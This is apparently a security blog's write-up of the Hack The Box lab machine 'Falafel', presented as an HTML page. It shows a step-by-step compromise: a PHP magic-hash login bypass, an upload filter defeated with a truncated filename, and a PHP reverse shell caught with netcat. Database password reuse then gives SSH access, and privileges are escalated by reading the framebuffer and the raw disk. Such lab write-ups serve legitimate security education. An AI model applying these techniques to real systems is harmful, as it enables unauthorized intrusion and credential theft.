@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Falafel Writeup</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Security researching from the nordics" />
+    <link rel="shortcut icon" href="/assets/images/static/blog-icon.png" type="image/png" />
+    <link rel="canonical" href="/falafel-writeup" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Securityits.io" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Falafel Writeup" />
+    <meta property="og:description" content="My writeup of the Hack the box Falafel. Let’s kick things off with the general purpose portscan using NMAP. root@kali:~/Falafel$ nmap -p- -T4 -Pn 10.10.10.73 Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-21 09:59 CEST Nmap scan report for falafel.htb (10.10.10.73) Host is up (0.078s latency). Not shown: 65533 closed" />
+    <meta property="og:url" content="/falafel-writeup" />
+    <meta property="og:image" content="/assets/images/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg" />
+    <meta property="article:publisher" content="https://www.facebook.com/false" />
+    <meta property="article:author" content="https://www.facebook.com/false" />
+    <meta property="article:published_time" content="2018-06-23T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2018-06-23T00:00:00+00:00" />
+    <meta property="article:tag" content="Ctf" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Falafel Writeup" />
+    <meta name="twitter:description" content="My writeup of the Hack the box Falafel. Let’s kick things off with the general purpose portscan using NMAP. root@kali:~/Falafel$ nmap -p- -T4 -Pn 10.10.10.73 Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-21 09:59 CEST Nmap scan report for falafel.htb (10.10.10.73) Host is up (0.078s latency). Not shown: 65533 closed" />
+    <meta name="twitter:url" content="/" />
+    <meta name="twitter:image" content="/assets/images/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Securityits.io" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Ctf" />
+    <meta name="twitter:site" content="@Securitybits_io" />
+    <meta name="twitter:creator" content="@Securitybits_io" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Securityits.io",
+        "logo": "/assets/images/static/blog-icon.png"
+    },
+    "url": "/falafel-writeup",
+    "image": {
+        "@type": "ImageObject",
+        "url": "/assets/images/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "/falafel-writeup"
+    },
+    "description": "My writeup of the Hack the box Falafel. Let’s kick things off with the general purpose portscan using NMAP. root@kali:~/Falafel$ nmap -p- -T4 -Pn 10.10.10.73 Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-21 09:59 CEST Nmap scan report for falafel.htb (10.10.10.73) Host is up (0.078s latency). Not shown: 65533 closed"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Falafel Writeup" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+                <a class="site-nav-logo" href="/"><img src="/assets/images/static/blog-icon.png" alt="Securityits.io" /></a>
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-github" role="menuitem"><a href="https://github.com/securitybits-io">Github</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            
+                <a class="social-link social-link-tw" href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a>
+            
+        </div>
+        
+    </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-ctf post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="23 June 2018">23 June 2018</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Falafel Writeup</h1>
+            </header>
+
+            
+            <figure class="post-full-image" style="background-image: url(/assets/images/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg)">
+            </figure>
+            
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <blockquote>
+  <p>My writeup of the Hack the box Falafel.</p>
+</blockquote>
+
+<p>Let’s kick things off with the general purpose portscan using NMAP.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ nmap -p- -T4 -Pn 10.10.10.73
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-21 09:59 CEST
+Nmap scan report for falafel.htb (10.10.10.73)
+Host is up (0.078s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 387.79 seconds
+</code></pre></div></div>
+
+<p>So SSH(22) and Web(80) are both open, so we are dealing with a web server.
+Lets enumerate the versions.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ nmap -p22,80 -sV --version-all -Pn 10.10.10.73
+[..snip..]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[..snip..]
+</code></pre></div></div>
+
+<p>As well perform a banner grab using Netcat</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ nc 10.10.10.73 80
+GET / HTTP/1.1
+HTTP/1.1 400 Bad Request
+Date: Thu, 21 Jun 2018 15:12:43 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 303
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+</code></pre></div></div>
+
+<p>Cool, so we are dealing with a web server enumerated and verified the version. Doing a quick check with searchsploit yielded no result, except a user enumeration for OpenSSH Users. Nothing that is extremely interesting for us. Since we don’t have a user or password, lets check out the webserver on port 80. Before actually browse to the webpage, lets start a gobuster session to find any hidden directories and files (txt and php).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ gobuster -u http://10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x .txt,.php
+</code></pre></div></div>
+
+<p>Now I preface that I use Firefox, and run the connection through Burpsuite Proxy, as you never know what you might pick up. Running the connection through Burpsuite has some other benefits as well, like recording all the requests or automatic spidering.</p>
+
+<p>Browsing to falafel we see two things, user and domain <code class="language-plaintext highlighter-rouge">IT@falafel.htb</code>, and “Login” which does sound interesting.</p>
+
+<p><img src="assets/images/posts/2018/06/falafel-writeup/Falafel-Lovers---Login-Page---Mozilla-Firefox_061.png" alt="Falafel-Lovers---Login-Page---Mozilla-Firefox_061" /></p>
+
+<p>Checking the sourcecode does not reveal anything interesting. So lets go back to our gobuster session.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.73/
+[+] Threads      : 50
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes : 301,302,307,200,204
+[+] Extensions   : .txt,.php
+=====================================================
+/profile.php (Status: 302)
+/uploads (Status: 301)
+/upload.php (Status: 302)
+/cyberlaw.txt (Status: 200)
+/connection.php (Status: 200)
+[..snip uninteressting stuff..]
+=====================================================
+</code></pre></div></div>
+
+<p>At this point we can make some assumptions on the results.</p>
+
+<p><code class="language-plaintext highlighter-rouge">/connection.php</code> - usually exists when there’s a database server backend<br />
+<code class="language-plaintext highlighter-rouge">/cyberlaw.txt</code> - contains some interesting usernames; <code class="language-plaintext highlighter-rouge">admin</code>, <code class="language-plaintext highlighter-rouge">lawyers</code>, <code class="language-plaintext highlighter-rouge">devs</code> and <code class="language-plaintext highlighter-rouge">chris</code>. But also that the uploads form is vulnerable.<br />
+<code class="language-plaintext highlighter-rouge">/uploads.php</code> - Apparently vulnerable, but is protected by a login form.</p>
+
+<p>So with that information, the next step is to try and bypass the login form.
+Generally start with trying some simple SQL Injection techniques, since we did see the <code class="language-plaintext highlighter-rouge">/connection.php</code>. As well as scouring stackoverflow for php auth bypasses. None of that worked, so googling continues, when I did find a writeup on Magic Hashes from WhiteHat Security<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> (Interesting research, I recommend a read through). So what we’ll use is a simple hash collision.</p>
+
+<p>Supplying <code class="language-plaintext highlighter-rouge">username=admin&amp;password=240610708</code> to the <code class="language-plaintext highlighter-rouge">/login.php</code> site will result in a Login Successful!<br />
+And now we are presented with <code class="language-plaintext highlighter-rouge">/upload.php</code> which from previous information stated, is vulnerable to some kind of file upload bypass. Another assumption is that files uploaded through this form is also added to <code class="language-plaintext highlighter-rouge">/uploads/</code> found with gobuster.</p>
+
+<p><img src="assets/images/posts/2018/06/falafel-writeup/Falafel-Lovers---Image-Upload---Mozilla-Firefox_063.png" alt="Falafel-Lovers---Image-Upload---Mozilla-Firefox_063" /></p>
+
+<p>Seeing that the upload form cannot browse a file to upload, but rather specify a URL we can start a simple http webserver with python.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ python -m SimpleHTTPServer 3999
+Serving HTTP on 0.0.0.0 port 3999 ...
+</code></pre></div></div>
+
+<p>Seeing that it requests an image to be uploaded. I reckon that’s the first thing I should try, in order to see if it presents me with a link to my uploaded file.<br />
+Uploading <code class="language-plaintext highlighter-rouge">http://10.10.14.7:3999/viking.png</code> I get presented with this output.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CMD: cd /var/www/html/uploads/0621-1924_63b0bd5de1c81bcd; wget 'http://10.10.14.7:3999/viking.png'
+
+--2018-06-21 19:24:49--  http://10.10.14.7:3999/viking.png
+Connecting to 10.10.14.7:3999... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8889 (8.7K) [image/png]
+Saving to: 'viking.png'
+
+     0K ........                                              100% 19.1M=0s
+
+2018-06-21 19:24:49 (19.1 MB/s) - 'viking.png' saved [8889/8889]
+</code></pre></div></div>
+
+<p>Cool so that is using a tool we should recognize, wget. It also echoes out the folder it saves the image to. A simple browse to <code class="language-plaintext highlighter-rouge">http://10.10.10.73/uploads/0621-1924_63b0bd5de1c81bcd/viking.png</code> should then present us with the image.</p>
+
+<p><img src="assets/images/posts/2018/06/falafel-writeup/viking.png--PNG-Image--141---141-pixels----Mozilla-Firefox_065.png" alt="viking.png--PNG-Image--141---141-pixels----Mozilla-Firefox_065" /></p>
+
+<p>So it gives us both the folder name where it is saved and also we have access to it… Since it is running a php backend, lets try and upload a reverse shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ cp /usr/share/webshells/php/php-reverse-shell.php ./sb.php
+root@kali:~/Falafel$ sed -i -e 's/127.0.0.1/10.10.14.7/g' sb.php
+root@kali:~/Falafel$ sed -i -e 's/$port = 1234;/$port = 4000;/g' sb.php
+</code></pre></div></div>
+
+<p>Having set the ip and port of my kali box, we should also put up something to catch the shell with netcat.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ nc -lvvp 4000
+listening on [any] 4000 ...
+</code></pre></div></div>
+
+<p>Trying to upload <code class="language-plaintext highlighter-rouge">sb.php</code> using a URL, I get the response:</p>
+<blockquote>
+  <p>Something bad happened:
+Bad extension
+Specify a URL of an image to upload:</p>
+</blockquote>
+
+<p>Running through OWASP’s Guide to bypass filtered uploads<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>, Didn’t really give anything either. So again after some googling, I had the idea that since the upload form is using wget to fetch files. Then maybe supplying a filename longer then linux can handle, maybe we can get it to “cut off” the picture file ending.<br />
+Popping over to UnixStackExchange<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>, we get to know that a linux filename can be 255 characters long. So maybe if I find a filename that is long enough, that might cause an overflow, thus removing all characters over the limit.</p>
+
+<p>So I tested with a 245 character long filename, and the response was:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Upload Succsesful!
+Output:
+CMD: cd /var/www/html/uploads/0621-2200_805b0c016de450a8; wget 'http://10.10.14.7:3999/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png'
+
+The name is too long, 245 chars total.
+Trying to shorten...
+New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[..snip..]
+</code></pre></div></div>
+
+<p>So now we can see that supplying a 232 character long filename like</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ python -c "print 'A'*232 + '.php' + '.jpg'"
+</code></pre></div></div>
+
+<p>Containing our php code and a ‘GIF89’ at the beginning, will using the ‘.jpg’ bypass the image filter, but the script will shorted and cut out the last 4 characters, leaving the file names as <code class="language-plaintext highlighter-rouge">'A'*232 + '.php'</code>.
+So taking my <code class="language-plaintext highlighter-rouge">sb.php</code> reverse shell, and renaming it to the convention</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CMD: cd /var/www/html/uploads/0621-2211_287036c71d5619df; wget 'http://10.10.14.7:3999/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.jpg'
+
+The name is too long, 240 chars total.
+Trying to shorten...
+[..snip..]
+2018-06-21 22:11:25 (338 MB/s) - 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php' saved [3466/3466]
+[..snip..]
+</code></pre></div></div>
+
+<p>Now doing a curl to will trigger the backdoor and kick back a shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ curl http://10.10.10.73/uploads/0621-2211_287036c71d5619df/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ nc -lvvp 4000
+listening on [any] 4000 ...
+connect to [10.10.14.7] from falafel.htb [10.10.10.73] 47088
+Linux falafel 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 22:15:33 up 3 days, 17:54,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+yossi    tty1                      Mon04    3days  0.05s  0.04s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ bash -i
+www-data@falafel:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@falafel:/$
+</code></pre></div></div>
+
+<p>Now that worked fairly terrific! Remember <code class="language-plaintext highlighter-rouge">/connection.php</code> that where discovered earlier, lets have a look into that one.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@falafel:/var/www/html$ cat connection.php
+&lt;?php
+   define('DB_SERVER', 'localhost:3306');
+   define('DB_USERNAME', 'moshe');
+   define('DB_PASSWORD', 'falafel[snip]');
+   define('DB_DATABASE', 'falafel');
+   [..snip..]
+?&gt;
+www-data@falafel:/var/www/html$
+</code></pre></div></div>
+
+<p>Nice DB Creds. Well maybe they are reusing that password?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Falafel$ ssh moshe@10.10.10.73
+moshe@10.10.10.73's password: falafel[snip]
+$ bash -i
+moshe@falafel:~$ id
+uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
+moshe@falafel:~$ ls -alsh user.txt
+4.0K -r-------- 1 moshe moshe 33 Nov 27  2017 user.txt
+moshe@falafel:~$
+</code></pre></div></div>
+
+<p>That takes care of the user flag. Time for some further enumeration as user:moshe. Now that we have a ssh shell, lets see whats stored in the DB.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -u moshe -p
+Enter password: falafel[snip]
+[..snip..]
+mysql&gt; use falafel
+Database changed
+mysql&gt; select * from users;
++----+----------+----------------------------------+--------+
+| ID | username | password                         | role   |
++----+----------+----------------------------------+--------+
+|  1 | admin    | 0e462096931906507119562988736854 | admin  |
+|  2 | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 | normal |
++----+----------+----------------------------------+--------+
+mysql&gt;exit;
+moshe@falafel:~$
+</code></pre></div></div>
+
+<p>Hash cracking time, favourite time!… Which didn’t yield any good results.
+So back to enumeration. checking groups you can see that there was some non-default assigned to moshe</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>moshe@falafel:~$ cat /etc/group|grep video
+video:x:44:moshe
+moshe@falafel:~$
+</code></pre></div></div>
+
+<p>Now video is an interesting group, according to Ubuntu Wiki<sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">4</a></sup> <code class="language-plaintext highlighter-rouge">The "video" group can access /dev/fb0</code> which is a framebuffer.
+So with that in mind we can run some simple commands and capture the image from fb0. But to be able to convert it into a image we also need the resolution of fb0.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>moshe@falafel:~$ cat /dev/fb0 &gt; /tmp/sb.raw
+moshe@falafel:~$ cat /sys/class/graphics/fb0/virtual_size
+1176,885
+moshe@falafel:~$
+</code></pre></div></div>
+
+<p>Using SCP or your own preference in transferring the image to your own Kali, the script <code class="language-plaintext highlighter-rouge">iraw2png.pl</code><sup id="fnref:5" role="doc-noteref"><a href="#fn:5" class="footnote" rel="footnote">5</a></sup> can be used to convert the “raw” image to a viewable png. which gets us the user:yossi password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh yossi@10.10.10.73
+yossi@10.10.10.73's password: Moshe[..snip..]
+yossi@falafel:~$ cat /etc/group | grep disk
+disk:x:6:yossi
+yossi@falafel:~$
+</code></pre></div></div>
+
+<p>Again we see that yossi is in an interesting group “disk” gives the permission for users in the group to read contents of <code class="language-plaintext highlighter-rouge">/dev/sdX</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>yossi@falafel:~$ ls /dev/sda*
+/dev/sda  /dev/sda1  /dev/sda2  /dev/sda5
+yossi@falafel:~$ strings /dev/sda5 | grep root.txt
+[..snip..]
+echo "EatSleepPwnRepeat" &gt; root.txt
+[..snip..]
+yossi@falafel:~$
+</code></pre></div></div>
+
+<p>This was a really interesting box!<br />
+Done!</p>
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p><a href="https://www.whitehatsec.com/blog/magic-hashes/">Magic Hashes</a> <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:2" role="doc-endnote">
+      <p><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload">OWASP Unrestricted File Upload</a> <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:3" role="doc-endnote">
+      <p><a href="https://unix.stackexchange.com/questions/32795/what-is-the-maximum-allowed-filename-and-folder-size-with-ecryptfs">Unix Stack Excange</a> <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:4" role="doc-endnote">
+      <p><a href="https://wiki.ubuntu.com/Security/Privileges">Ubuntu Wikipedia</a> <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:5" role="doc-endnote">
+      <p><a href="https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/">iraw2png.pl</a> <a href="#fnref:5" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+                <!-- #author-->
+                
+                    
+                        <section class="author-card">
+                            
+                                <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="christoffer" />
+                            
+                            <section class="author-card-content">
+                                <h4 class="author-card-name"><a href="/author/christoffer">Christoffer Claesson</a></h4>
+                                
+                                    <p>I am Christoffer Claesson, a professional security researcher from Sweden who spends his days (and many nights) on red teaming, security deep dives, and homelab experiments. This blog is my way of giving back to the community by sharing lessons, notes, and the occasional side project that grew bigger than planned.</p>
+                                
+                            </section>
+                        </section>
+                        <div class="post-full-footer-right">
+                            <a class="author-card-button" href="/author/christoffer">Read More</a>
+                        </div>
+                    
+                
+                <!-- /author  -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+<!-- Links to Previous/Next posts -->
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+            
+                
+                
+                
+                
+                    <article class="read-next-card"
+                        
+                            style="background-image: url(/assets/images/static/blog-cover.jpg)"
+                        
+                    >
+                        <header class="read-next-card-header">
+                            <small class="read-next-card-header-sitetitle">&mdash; Securityits.io &mdash;</small>
+                            
+                                <h3 class="read-next-card-header-title"><a href="/tag/ctf/">Ctf</a></h3>
+                            
+                        </header>
+                        <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
+</div>
+                        <div class="read-next-card-content">
+                            <ul>
+                                
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/reverse-engineering-an-unknown-digital-protocol">Reverse Engineering an unknown digital protocol: RHME2, Whac a mole</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/valentine-writeup">Valentine Writeup</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/chatterbox-writeup">Chatterbox Writeup</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                
+                            </ul>
+                        </div>
+                        <footer class="read-next-card-footer">
+                            <a href="/tag/ctf/">
+                                
+                                    See all 5 posts  →
+                                
+                            </a>
+                        </footer>
+                    </article>
+                
+            
+
+            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/valentine-writeup">
+                <div class="post-card-image" style="background-image: url(/assets/images/posts/2018/07/valentine-writeup/valentine-banner.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/valentine-writeup">
+                <header class="post-card-header">
+                    
+                        
+                            
+                                <span class="post-card-tags">Ctf</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">Valentine Writeup</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>
+  Heartbleeds and dirty cows, i feel sorry for the creator!
+
+
+</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/christoffer/">Christoffer Claesson</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      5 min read
+                    
+                </span>
+            </footer>
+        </div>
